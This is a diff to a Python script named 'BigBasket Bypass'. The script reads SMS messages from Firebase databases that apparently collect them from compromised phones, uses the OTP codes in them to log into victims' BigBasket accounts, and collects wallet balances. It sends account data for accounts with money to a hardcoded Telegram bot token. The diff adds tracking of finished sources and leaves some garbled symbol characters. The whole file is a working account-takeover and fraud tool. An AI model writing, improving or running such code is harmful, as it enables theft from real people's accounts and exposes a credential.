@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-BigBasket Bypass — BACKGROUND WORKER EDITION
-- No HTTP server needed (Background Worker me kaam nahi aata)
+BigBasket Bypass  BACKGROUND WORKER EDITION
+- Auto-skip completed firebases (completed.json)
 - Better OTP detection
 - Longer OTP wait (SMS delay handle)
 - Auto-resume from used.json
@@ -62,12 +62,13 @@ def log(*a, **kw):
 BOT_TOKEN = "8193791477:AAEVazSxsLxFI1RWiQ4RTmSOObqV_-gy1YI"
 CHAT_ID   = 8287613405
 
-FIREBASE_FILE = "firebase.txt"
-USED_FILE     = "used.json"
+FIREBASE_FILE  = "firebase.txt"
+USED_FILE      = "used.json"
+COMPLETED_FILE = "completed.json"   #  naya
 
-# ⬆ OTP timing (SMS delay ke hisaab se)
-OTP_WAIT_SECONDS       = 45      # 25 → 45
-OTP_FAST_SKIP_AFTER    = 35      # 20 → 35
+#  OTP timing (SMS delay ke hisaab se)
+OTP_WAIT_SECONDS       = 45
+OTP_FAST_SKIP_AFTER    = 35
 OTP_HEARTBEAT_EVERY    = 5
 
 FB_REQUEST_TIMEOUT     = 6
@@ -155,22 +156,83 @@ USED = UsedTracker(USED_FILE)
 
 
 # ============================================================
+#  COMPLETED FIREBASE TRACKER
+# ============================================================
+class CompletedTracker:
+    """Kaunse firebase already process ho gaye unko track karo."""
+    def __init__(self, path=COMPLETED_FILE):
+        self.path = path
+        self._lock = threading.Lock()
+        self.data: Set[str] = set()
+        self._dirty = False
+        self._load()
+
+    def _load(self):
+        try:
+            if os.path.exists(self.path):
+                with open(self.path, "r", encoding="utf-8") as f:
+                    d = json.load(f)
+                if isinstance(d, list):
+                    self.data = set(str(x) for x in d)
+                elif isinstance(d, dict):
+                    self.data = set(d.keys())
+                logger.info(f"completed.json loaded: {len(self.data)} firebase(s)")
+        except Exception as e:
+            logger.warning(f"completed.json load: {e}")
+
+    def save(self):
+        with self._lock:
+            if not self._dirty: return
+            try:
+                tmp = f"{self.path}.tmp"
+                with open(tmp, "w", encoding="utf-8") as f:
+                    json.dump(sorted(self.data), f, indent=2, ensure_ascii=False)
+                os.replace(tmp, self.path)
+                self._dirty = False
+            except Exception as e:
+                logger.error(f"completed save: {e}")
+
+    def is_done(self, url: str) -> bool:
+        with self._lock:
+            return url in self.data
+
+    def mark_done(self, url: str):
+        with self._lock:
+            self.data.add(url)
+            self._dirty = True
+        self.save()
+
+    def count(self) -> int:
+        with self._lock:
+            return len(self.data)
+
+    def reset(self):
+        with self._lock:
+            self.data = set()
+            self._dirty = True
+        self.save()
+
+
+COMPLETED = CompletedTracker(COMPLETED_FILE)
+
+
+# ============================================================
 # PATTERNS (broader OTP coverage)
 # ============================================================
 PHONE_PATTERNS = [
-    re.compile(r'(?:Jio|JIO)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Airtel|AIRTEL)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:BSNL|bsnl)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:MTNL|mtnl)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Docomo|DOCOMO|Tata)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Reliance|RELIANCE)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Telenor|TELENOR)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Uninor|UNINOR)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:Videocon|VIDEOCON)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:नंबर|নম্বৰ)\s*[:\-]\s*([6-9][0-9]{9})'),
-    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})', re.I),
-    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})', re.I),
+    re.compile(r'(?:Jio|JIO)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Airtel|AIRTEL)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:BSNL|bsnl)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:MTNL|mtnl)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Docomo|DOCOMO|Tata)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Reliance|RELIANCE)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Telenor|TELENOR)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Uninor|UNINOR)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:Videocon|VIDEOCON)\s+(?:Number||Nambhar||No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:|)\s*[:\-]\s*([6-9][0-9]{9})'),
+    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})', re.I),
+    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|)\s*[:\-]\s*([6-9][0-9]{9})', re.I),
     re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.I),
     re.compile(r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})', re.I),
     re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
@@ -178,19 +240,19 @@ PHONE_PATTERNS = [
     re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)')
 ]
 
-# 🔥 BROADER OTP PATTERNS (6 digits, any context)
+#  BROADER OTP PATTERNS (6 digits, any context)
 OTP_PATTERNS = [
-    re.compile(r'(?<!\d)(\d{6})(?!\d)'),  # any 6-digit sequence
+    re.compile(r'(?<!\d)(\d{6})(?!\d)'),
 ]
 
-# 🔥 BROADER KEYWORDS — zyada keywords, kam strict
+#  BROADER KEYWORDS
 OTP_KEYWORDS = [
     'bigbasket', 'big basket', 'bbnow', 'login code', 'bgcity',
     'otp', 'verification', 'tataneu', 'tata', 'basket', 'code',
     'bb', 'login', 'verify', 'auth',
 ]
 
-# 🔥 BLOCKLIST — in messages me OTP nahi hoga
+#  BLOCKLIST  in messages me OTP nahi hoga
 OTP_BLOCKLIST = ['% off', 'sale', 'offer', 'discount', 'cashback', 'coupon']
 
 
@@ -296,23 +358,12 @@ def extract_all_phones_from_device(info, messages, cid):
 
 
 def _extract_otp_from_text(text):
-    """
-    Broader OTP extraction:
-    - Check blocklist (promo messages)
-    - Prefer messages with OTP keywords
-    - Fallback: any 6-digit in BigBasket/Tata context
-    """
     if not text: return None
     tl = text.lower()
-
-    # blocklist first
     if any(b in tl for b in OTP_BLOCKLIST):
         return None
-
-    # must have at least one OTP keyword
     if not any(kw in tl for kw in OTP_KEYWORDS):
         return None
-
     for pat in OTP_PATTERNS:
         try: m = pat.search(text)
         except Exception: continue
@@ -322,7 +373,6 @@ def _extract_otp_from_text(text):
         raw = grp if grp is not None else m.group(0)
         otp = re.sub(r'\D','', raw or '')
         if len(otp)==6 and otp.isdigit():
-            # ignore year-like values
             if otp.startswith(('19','20')) and otp[2:4] in ('00','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26'):
                 continue
             return otp
@@ -482,7 +532,6 @@ def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
     s = requests.Session(); s.verify = False
     base = fb_url.rstrip('/')
     last_hb = 0; seen_any = False
-    last_log = 0
 
     while time.time() - start < timeout:
         if SHUTDOWN_REQUESTED.is_set():
@@ -490,9 +539,9 @@ def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
         elapsed = int(time.time() - start)
         if elapsed > 0 and elapsed % OTP_HEARTBEAT_EVERY == 0 and elapsed != last_hb:
             last_hb = elapsed
-            print(f"      {C.dim(f'⏳ {elapsed}s / {timeout}s ...')}", flush=True)
+            print(f"      {C.dim(f' {elapsed}s / {timeout}s ...')}", flush=True)
         if not seen_any and elapsed >= OTP_FAST_SKIP_AFTER:
-            print(f"      {C.err('✗ skip (no OTP in {}s)'.format(OTP_FAST_SKIP_AFTER))}", flush=True)
+            print(f"      {C.err(' skip (no OTP in {}s)'.format(OTP_FAST_SKIP_AFTER))}", flush=True)
             return None
         try:
             url = f"{base}/messages/{client_id}.json"
@@ -505,7 +554,7 @@ def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
                 if not isinstance(msg, dict): continue
                 try: ts = int(msg_id)
                 except (ValueError, TypeError): continue
-                if ts < (trigger_ms - 90000): continue  # 90s window
+                if ts < (trigger_ms - 90000): continue
                 text = str(msg.get('body') or msg.get('message') or msg.get('text') or msg.get('msg') or '')
                 otp = _extract_otp_from_text(text)
                 if not otp: continue
@@ -739,12 +788,12 @@ async def send_telegram_alert(fb_url, device_id, phone, client, wallet, freecash
                 form.add_field("chat_id", str(CHAT_ID))
                 form.add_field("document", jb, filename=f"{phone}_{total}.json",
                                content_type="application/json")
-                form.add_field("caption", f"OK | W=₹{int(wallet)} F=₹{int(freecash)} T=₹{total} →")
+                form.add_field("caption", f"OK | W={int(wallet)} F={int(freecash)} T={total} ")
                 await s.post(f"{base}/sendDocument", data=form,
                              timeout=aiohttp.ClientTimeout(total=30))
             except Exception as e:
                 logger.error(f"sendDoc: {e}")
-        logger.info(f"[TG] Sent {phone} | ₹{total}")
+        logger.info(f"[TG] Sent {phone} | {total}")
     except Exception as e:
         logger.error(f"[TG] {e}")
 
@@ -762,22 +811,22 @@ async def _process_one_phone(device_id, phone, fb_url):
 
         ok = await asyncio.to_thread(client.request_otp, phone)
         if not ok:
-            log(f"      {C.err('❌ OTP send failed')} → {phone} ({client.last_otp_error})")
+            log(f"      {C.err(' OTP send failed')}  {phone} ({client.last_otp_error})")
             return {"phone": phone, "device_id": device_id, "success": False,
                     "error": f"OTP: {client.last_otp_error}"}
-        log(f"      {C.ok('✅ OTP sent')} → {C.BOLD}{phone}{C.RESET}")
+        log(f"      {C.ok(' OTP sent')}  {C.BOLD}{phone}{C.RESET}")
 
         trigger_ms = int(time.time() * 1000)
         otp = await asyncio.to_thread(fetch_one_new_otp, fb_url, device_id,
                                        OTP_WAIT_SECONDS, trigger_ms, baseline)
         if not otp:
-            log(f"      {C.err('✗ No OTP')} → {phone}")
+            log(f"      {C.err(' No OTP')}  {phone}")
             return {"phone": phone, "device_id": device_id, "success": False, "error": "no OTP"}
 
-        log(f"      {C.info('🔐 Verifying')} {phone} {C.dim('OTP=')}{C.BOLD}{otp}{C.RESET}")
+        log(f"      {C.info(' Verifying')} {phone} {C.dim('OTP=')}{C.BOLD}{otp}{C.RESET}")
         verified = await asyncio.to_thread(client.verify_otp, phone, otp)
         if not verified:
-            log(f"      {C.err('✗ Verify failed')} → {phone} ({client.last_otp_error})")
+            log(f"      {C.err(' Verify failed')}  {phone} ({client.last_otp_error})")
             return {"phone": phone, "device_id": device_id, "success": False,
                     "error": f"Verify: {client.last_otp_error}"}
 
@@ -790,16 +839,16 @@ async def _process_one_phone(device_id, phone, fb_url):
         USED.mark_used(device_id, phone, wallet=wb, freecash=fb, fb_url=fb_url)
 
         if tc >= MIN_BALANCE_TO_SEND:
-            log(f"      {C.ok('✅ OK')} {phone} | {C.money('₹'+str(wb))}+{C.money('₹'+str(fb))}"
-                f"={C.head('₹'+str(tc))} → {C.GREEN}TG{C.RESET}")
+            log(f"      {C.ok(' OK')} {phone} | {C.money(''+str(wb))}+{C.money(''+str(fb))}"
+                f"={C.head(''+str(tc))}  {C.GREEN}TG{C.RESET}")
             await send_telegram_alert(fb_url, device_id, phone, client, wb, fb, otp)
         else:
-            log(f"      {C.ok('✅ OK')} {phone} | {C.dim('₹0 → skip TG')}")
+            log(f"      {C.ok(' OK')} {phone} | {C.dim('0  skip TG')}")
 
         return {"phone": phone, "device_id": device_id, "success": True,
                 "wallet": wb, "freecash": fb, "total": tc, "otp": otp}
     except Exception as e:
-        log(f"      {C.err('✗ Error')} {phone}: {e}")
+        log(f"      {C.err(' Error')} {phone}: {e}")
         return {"phone": phone, "device_id": device_id, "success": False, "error": str(e)[:120]}
     finally:
         try: client.session.close()
@@ -812,11 +861,11 @@ async def process_device_all_phones(device_id, device_info, fb_url, dev_idx, dev
     skipped = [p for p in phones_all if USED.is_used(device_id, p)]
     name = device_info.get("name", device_id[:12])
 
-    log(f"\n   {C.head('━' * 70)}")
-    log(f"   {C.head(f'📱 DEV {dev_idx}/{dev_total}')} {C.dev(name)} "
-        f"→ {C.BOLD}{len(phones_all)}{C.RESET} phone(s)"
+    log(f"\n   {C.head('' * 70)}")
+    log(f"   {C.head(f' DEV {dev_idx}/{dev_total}')} {C.dev(name)} "
+        f" {C.BOLD}{len(phones_all)}{C.RESET} phone(s)"
         + (f" {C.dim(f'(skip {len(skipped)})')}" if skipped else ""))
-    log(f"   {C.head('━' * 70)}")
+    log(f"   {C.head('' * 70)}")
 
     if not fresh:
         log(f"   {C.dim('   All already used.')}")
@@ -825,9 +874,9 @@ async def process_device_all_phones(device_id, device_info, fb_url, dev_idx, dev
     results = []
     for i, phone in enumerate(fresh, 1):
         if SHUTDOWN_REQUESTED.is_set():
-            log(f"   {C.warn('⚠️  Shutdown — stopping early')}")
+            log(f"   {C.warn('  Shutdown  stopping early')}")
             break
-        log(f"\n   {C.info(f'▶ [{i}/{len(fresh)}]')} {C.BOLD}{phone}{C.RESET}")
+        log(f"\n   {C.info(f' [{i}/{len(fresh)}]')} {C.BOLD}{phone}{C.RESET}")
         r = await _process_one_phone(device_id, phone, fb_url)
         results.append(r)
     return results
@@ -840,9 +889,9 @@ async def _process_devices_in_batches(devices_list, fb_url):
         if SHUTDOWN_REQUESTED.is_set(): break
         batch = devices_list[bs:bs+DEVICES_PARALLEL]
         be = bs + len(batch)
-        log(f"\n{C.head('🔥' * 25)}")
-        log(f"{C.head(f'BATCH {bs+1}-{be}/{total}')} → {len(batch)} devices parallel")
-        log(f"{C.head('🔥' * 25)}")
+        log(f"\n{C.head('' * 25)}")
+        log(f"{C.head(f'BATCH {bs+1}-{be}/{total}')}  {len(batch)} devices parallel")
+        log(f"{C.head('' * 25)}")
         tasks = []
         for i, (did, dinfo) in enumerate(batch):
             dn = bs + i + 1
@@ -859,7 +908,7 @@ async def _process_devices_in_batches(devices_list, fb_url):
 # MAIN FLOW
 # ============================================================
 def print_banner():
-    log(f"{C.MAGENTA}{C.BOLD}\n  BigBasket Bypass — BACKGROUND WORKER\n{C.RESET}")
+    log(f"{C.MAGENTA}{C.BOLD}\n  BigBasket Bypass  BACKGROUND WORKER\n{C.RESET}")
 
 
 def _fmt_scan_row(idx, url, s):
@@ -873,7 +922,7 @@ def _fmt_scan_row(idx, url, s):
         return f"{is_} {us} {C.err(f'[{s["status"]}]')}"
     return (f"{is_} {us} online={C.ok(str(s['online']))} "
             f"offline={C.dim(str(s['offline']))} total={C.money(str(s['total']))} "
-            f"{C.GREEN}✔{C.RESET}")
+            f"{C.GREEN}{C.RESET}")
 
 
 async def scan_all_streaming(urls):
@@ -892,17 +941,17 @@ async def scan_all_streaming(urls):
         results[i] = r
         log(_fmt_scan_row(i+1, urls[i], r))
     log(C.head("=" * 100))
-    log(f"{C.dim(f'⚡ Scanned {len(urls)} firebase(s) in {time.time()-t0:.2f}s')}")
+    log(f"{C.dim(f' Scanned {len(urls)} firebase(s) in {time.time()-t0:.2f}s')}")
     return results
 
 
 async def process_firebase(fb_url, tag_label=""):
     label = f"{C.YELLOW}[{tag_label}]{C.RESET} {C.dev(fb_url)}" if tag_label else C.dev(fb_url)
-    log(f"\n{C.info('🔎 Fetching')} {label}...")
+    log(f"\n{C.info(' Fetching')} {label}...")
     t0 = time.time()
     online = await get_online_devices(fb_url)
     if not online:
-        log(C.err("❌ No online devices.")); return None
+        log(C.err(" No online devices.")); return None
 
     dwp = {cid: i for cid, i in online.items() if i.get("phones")}
     fresh_cnt = 0
@@ -910,16 +959,16 @@ async def process_firebase(fb_url, tag_label=""):
         for p in info["phones"]:
             if not USED.is_used(cid, p): fresh_cnt += 1
 
-    log(f"   {C.head('📊')} {C.dim(f'({time.time()-t0:.2f}s)')} "
+    log(f"   {C.head('')} {C.dim(f'({time.time()-t0:.2f}s)')} "
         f"online={C.BOLD}{len(online)}{C.RESET} "
         f"with_phones={C.BOLD}{len(dwp)}{C.RESET} "
         f"fresh={C.ok(str(fresh_cnt))}")
 
     if not dwp or fresh_cnt == 0:
-        log(f"   {C.dim('   → skip (no fresh)')}")
+        log(f"   {C.dim('    skip (no fresh)')}")
         return {"fresh": 0, "success": 0, "failed": 0, "cash": 0, "sent": 0}
 
-    log(f"   {C.warn(f'🚀 {fresh_cnt} fresh | OTP wait={OTP_WAIT_SECONDS}s | parallel={DEVICES_PARALLEL}')}")
+    log(f"   {C.warn(f' {fresh_cnt} fresh | OTP wait={OTP_WAIT_SECONDS}s | parallel={DEVICES_PARALLEL}')}")
 
     dl = list(dwp.items())
     t_s = time.time()
@@ -934,10 +983,10 @@ async def process_firebase(fb_url, tag_label=""):
             if t >= MIN_BALANCE_TO_SEND: sent += 1
         else: failed += 1
 
-    log(f"\n   {C.head('🏁 DONE')} {C.ok('✓'+str(success))} "
-        f"{C.err('✗'+str(failed))} "
+    log(f"\n   {C.head(' DONE')} {C.ok(''+str(success))} "
+        f"{C.err(''+str(failed))} "
         f"{C.head('TG='+str(sent))} "
-        f"{C.money('₹'+str(total_cash))} "
+        f"{C.money(''+str(total_cash))} "
         f"{C.dim(f'({time.time()-t_s:.1f}s)')}")
 
     return {"fresh": fresh_cnt, "success": success, "failed": failed,
@@ -951,52 +1000,75 @@ async def process_multiple_firebases(urls):
 
     for i, u in enumerate(urls, 1):
         if SHUTDOWN_REQUESTED.is_set():
-            log(C.warn(f"\n⚠️  Shutdown — stopped at {i}/{total}"))
+            log(C.warn(f"\n  Shutdown  stopped at {i}/{total}"))
             break
 
-        log("\n" + C.head("━" * 78))
-        log(f"{C.head(C.BOLD + f'🔥 FIREBASE {i}/{total}' + C.RESET)} "
+        log("\n" + C.head("" * 78))
+        log(f"{C.head(C.BOLD + f' FIREBASE {i}/{total}' + C.RESET)} "
             f"{C.dim(f'({total-i} remaining)')}")
-        log(C.head("━" * 78))
+        log(C.head("" * 78))
         try:
             r = await process_firebase(u, tag_label=f"{i}/{total}")
         except Exception as e:
             logger.error(f"process_firebase err: {e}")
             r = None
-        if r:
+
+        if r is not None:
             grand["success"] += r.get("success", 0)
             grand["failed"] += r.get("failed", 0)
             grand["cash"] += r.get("cash", 0)
             grand["sent"] += r.get("sent", 0)
-        log(f"\n   {C.dim('── PROGRESS ──')} {C.BOLD}{i}/{total}{C.RESET} | "
-            f"{C.ok('✓'+str(grand['success']))} {C.err('✗'+str(grand['failed']))} | "
+
+            #  MARK THIS FIREBASE AS COMPLETED
+            COMPLETED.mark_done(u)
+            log(f"   {C.dim(' marked completed')} "
+                f"{C.dim(f'(total done: {COMPLETED.count()})')}")
+        # else: error  next run me retry hoga
+
+        log(f"\n   {C.dim('�� PROGRESS ��')} {C.BOLD}{i}/{total}{C.RESET} | "
+            f"{C.ok(''+str(grand['success']))} {C.err(''+str(grand['failed']))} | "
             f"{C.head('TG='+str(grand['sent']))} | "
-            f"{C.money('₹'+str(grand['cash']))} | "
+            f"{C.money(''+str(grand['cash']))} | "
             f"{C.dim(f'{time.time()-t_all:.0f}s')}")
 
-    log("\n" + C.head("█" * 78))
-    log(C.head(C.BOLD + f"🏆 TOTAL — {len(urls)} FIREBASE(S)" + C.RESET))
-    log(C.head("█" * 78))
-    log(f"   {C.ok('✅ Success    :')} {C.BOLD}{grand['success']}{C.RESET}")
-    log(f"   {C.err('❌ Failed     :')} {C.BOLD}{grand['failed']}{C.RESET}")
-    log(f"   {C.head('📤 Sent to TG :')} {C.BOLD}{grand['sent']}{C.RESET}")
-    log(f"   {C.head('💰 Total Cash :')} {C.money('₹'+str(grand['cash']))}")
-    log(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")
-    log(f"   {C.dim('⏱  Time      :')} {C.dim(f'{time.time()-t_all:.2f}s')}")
-    log(C.head("█" * 78))
+    log("\n" + C.head("�" * 78))
+    log(C.head(C.BOLD + f" TOTAL  {len(urls)} FIREBASE(S)" + C.RESET))
+    log(C.head("�" * 78))
+    log(f"   {C.ok(' Success    :')} {C.BOLD}{grand['success']}{C.RESET}")
+    log(f"   {C.err(' Failed     :')} {C.BOLD}{grand['failed']}{C.RESET}")
+    log(f"   {C.head(' Sent to TG :')} {C.BOLD}{grand['sent']}{C.RESET}")
+    log(f"   {C.head(' Total Cash :')} {C.money(''+str(grand['cash']))}")
+    log(f"   {C.head(' used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")
+    log(f"   {C.head('  completed  :')} {C.BOLD}{COMPLETED.count()}{C.RESET}")
+    log(f"   {C.dim('  Time      :')} {C.dim(f'{time.time()-t_all:.2f}s')}")
+    log(C.head("�" * 78))
 
 
 async def auto_run_once():
     urls = load_firebase_urls()
     if not urls:
-        log(C.err(f"❌ No URLs in {FIREBASE_FILE}")); return False
+        log(C.err(f" No URLs in {FIREBASE_FILE}")); return False
     norm = [n for n in (normalize_fb_url(u) for u in urls) if n]
     if not norm:
-        log(C.err("❌ No valid URLs")); return False
-    log(f"\n{C.info('📡 Scanning')} {C.BOLD}{len(norm)}{C.RESET} firebase(s)...")
-    await scan_all_streaming(norm)
-    log(f"\n{C.ok('✅ Auto-selected ALL')} {C.BOLD}{len(norm)}{C.RESET}")
-    await process_multiple_firebases(norm)
+        log(C.err(" No valid URLs")); return False
+
+    #  FILTER: skip already-completed firebases
+    pending = [u for u in norm if not COMPLETED.is_done(u)]
+    skipped = len(norm) - len(pending)
+
+    log(f"\n{C.info(' Firebase status:')} "
+        f"total={C.BOLD}{len(norm)}{C.RESET} "
+        f"completed={C.dim(str(skipped))} "
+        f"pending={C.ok(str(len(pending)))}")
+
+    if not pending:
+        log(C.ok("\n All firebases already processed! Nothing to do."))
+        return True
+
+    log(f"\n{C.info(' Scanning')} {C.BOLD}{len(pending)}{C.RESET} pending firebase(s)...")
+    await scan_all_streaming(pending)
+    log(f"\n{C.ok(' Auto-selected')} {C.BOLD}{len(pending)}{C.RESET} pending firebase(s)")
+    await process_multiple_firebases(pending)
     return True
 
 
@@ -1008,19 +1080,23 @@ _shutdown_started = False
 def _signal_handler(signum, frame):
     global _shutdown_started
     if _shutdown_started:
-        log(C.err(f"\n❌ 2nd signal {signum} — FORCE EXIT"))
+        log(C.err(f"\n 2nd signal {signum}  FORCE EXIT"))
         os._exit(1)
     _shutdown_started = True
-    log(C.warn(f"\n⚠️  SIGNAL {signum} — graceful shutdown"))
-    log(C.warn(f"   → saving ({USED.count()} records)"))
+    log(C.warn(f"\n  SIGNAL {signum}  graceful shutdown"))
+    log(C.warn(f"    saving ({USED.count()} records, {COMPLETED.count()} completed)"))
     SHUTDOWN_REQUESTED.set()
     try: USED.save()
+    except Exception: pass
+    try: COMPLETED.save()
     except Exception: pass
 
     def _force():
         time.sleep(SIGTERM_GRACE_SECONDS)
-        log(C.err(f"\n💀 grace over — exit"))
+        log(C.err(f"\n grace over  exit"))
         try: USED.save()
+        except Exception: pass
+        try: COMPLETED.save()
         except Exception: pass
         os._exit(0)
     threading.Thread(target=_force, daemon=True).start()
@@ -1031,38 +1107,42 @@ def main():
     signal.signal(signal.SIGINT, _signal_handler)
 
     print_banner()
-    log(f"{C.head('⚙️  CONFIG')}")
+    log(f"{C.head('  CONFIG')}")
     log(f"   Used file:        {USED_FILE} ({USED.count()} records)")
+    log(f"   Completed FB:     {COMPLETED_FILE} ({COMPLETED.count()} done)")
     log(f"   Devices parallel: {DEVICES_PARALLEL}")
     log(f"   OTP wait:         {OTP_WAIT_SECONDS}s (fast-skip {OTP_FAST_SKIP_AFTER}s)")
-    log(f"   tls_client:       {'✅' if HAS_TLS else '❌ (requests)'}")
+    log(f"   tls_client:       {'' if HAS_TLS else ' (requests)'}")
 
-    log(f"\n{C.ok('✅ Starting main loop')}")
+    log(f"\n{C.ok(' Starting main loop')}")
 
     while not SHUTDOWN_REQUESTED.is_set():
         try:
             asyncio.run(auto_run_once())
         except KeyboardInterrupt:
-            log(C.warn("\n👋 KeyboardInterrupt")); break
+            log(C.warn("\n KeyboardInterrupt")); break
         except SystemExit: raise
         except Exception as e:
             logger.error(f"main crash: {e}")
             time.sleep(3)
         if AUTO_RERUN_DELAY <= 0: break
-        log(f"\n{C.info(f'🔁 Sleep {AUTO_RERUN_DELAY}s...')}")
+        log(f"\n{C.info(f' Sleep {AUTO_RERUN_DELAY}s...')}")
         try:
             for _ in range(AUTO_RERUN_DELAY):
                 if SHUTDOWN_REQUESTED.is_set(): break
                 time.sleep(1)
         except KeyboardInterrupt: break
 
-    log(C.warn(f"\n👋 Final save — {USED.count()} records"))
+    log(C.warn(f"\n Final save  {USED.count()} records, {COMPLETED.count()} firebase done"))
     USED.save()
+    COMPLETED.save()
 
 
 if __name__ == "__main__":
     try: main()
     except KeyboardInterrupt:
-        print("\n👋")
+        print("\n")
         try: USED.save()
+        except Exception: pass
+        try: COMPLETED.save()
         except Exception: pass
